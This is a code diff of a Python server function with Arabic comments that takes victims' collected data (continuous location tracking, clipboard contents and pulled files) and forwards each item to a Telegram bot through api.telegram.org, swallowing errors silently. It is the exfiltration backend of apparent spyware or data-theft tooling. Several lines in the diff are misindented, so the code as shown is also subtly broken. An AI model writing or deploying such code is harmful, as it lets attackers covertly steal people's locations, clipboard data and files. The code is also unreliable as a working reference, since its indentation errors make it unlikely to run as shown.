@@ -2146,40 +2146,41 @@ def send_data():
         # ====== الميزات الجديدة ======
 
 # تتبع الموقع المستمر
-if data.get('locations'):
-    for loc in data['locations']:
-        try:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
-            requests.post(url, data={
+        if data.get('locations'):
+            for loc in data['locations']:
+                try:
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
+                    requests.post(url, data={
                 'chat_id': chat_id,
                 'latitude': loc['lat'],
                 'longitude': loc['lng']
             })
-            time.sleep(0.3)
-        except:
-            pass
-
+                    time.sleep(0.3)
+                except:
+                    pass
+            #الحافظة📋
+        if data.get('clipboard'):
+            try:
+                msg = f"📋 **محتوى الحافظة:**\n\n{data['clipboard']}"
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
+            except:
+                pass
 # سحب الملفات
-if data.get('files'):
-    for file_data in data['files']:
-        try:
-            content = file_data['content'].split(',', 1)[1]
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-            files = {'document': base64.b64decode(content)}
-            caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
-            requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
-            time.sleep(0.3)
-        except:
-            pass
+        if data.get('files'):
+            for file_data in data['files']:
+                try:
+                    content = file_data['content'].split(',', 1)[1]
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+                    files = {'document': base64.b64decode(content)}
+                    caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
+                   requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
+                   time.sleep(0.3)
+                except:
+                    pass
 
-# الحافظة
-if data.get('clipboard'):
-    try:
-        msg = f"📋 **محتوى الحافظة:**\n\n{data['clipboard']}"
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
-    except:
-        pass
+
+
         
         return jsonify({'status': 'ok'})
     except Exception as e:
